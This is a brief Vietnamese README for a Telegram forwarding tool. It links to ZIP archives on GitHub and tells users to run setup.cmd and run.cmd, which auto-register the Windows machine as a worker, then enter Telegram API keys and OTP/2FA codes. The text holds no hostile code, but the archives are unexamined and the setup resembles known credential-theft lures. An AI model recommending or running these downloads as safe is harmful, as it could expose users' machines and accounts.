# Telegram Forwarder — setup xong, run tự kết nối

[Tải ZIP tự kết nối máy với web](https://github.com/reapertalkative1-create/assssss/raw/refs/heads/main/telegram-forwarder-control-center-windows-autoconnect.zip)

- Mở Docker Desktop. Bấm **setup.cmd** một lần để tạo tài khoản quản trị và tự tạo/lưu worker của máy này.
- Những lần sau bấm **run.cmd**: worker tự Online, hiện tên máy Windows và mở **http://127.0.0.1:8787**.
- Không cần tạo worker thủ công hoặc chép credential/URL. Máy có thể Online trước khi nhập thông tin Telegram.
- Khi bắt đầu dùng Telegram, vẫn cần API ID/hash và đăng nhập OTP/2FA của bạn.

**Cập nhật bản cũ:** giải nén đè mã nguồn vào đúng thư mục cũ, giữ .env.docker và Docker volume, chạy setup.cmd lại một lần để build image mới. Tài khoản, khóa và dữ liệu cũ được giữ lại.

[Hướng dẫn Windows](HUONG_DAN_WINDOWS.md) · [Kiểm thử tự kết nối](KIEM_THU_TU_KET_NOI.md)

Đã qua 33 kiểm thử Python liên quan, kiểm tra PowerShell và chạy thực tế với Docker/PostgreSQL: không nhập credential/API Telegram vẫn Online; run hai lần dùng cùng worker, không đổi khóa và không in credential ra console. Chưa thử trực tiếp CMD trên Windows hoặc Telegram thật.

SHA-256: `2ca10e0d19606709e648983da61dfda28c1e8ce7c96ea7ea54e4109336ea1376`.

Bản cũ: [Docker thủ công](https://github.com/reapertalkative1-create/assssss/raw/refs/heads/main/telegram-forwarder-control-center-windows-isolated.zip).
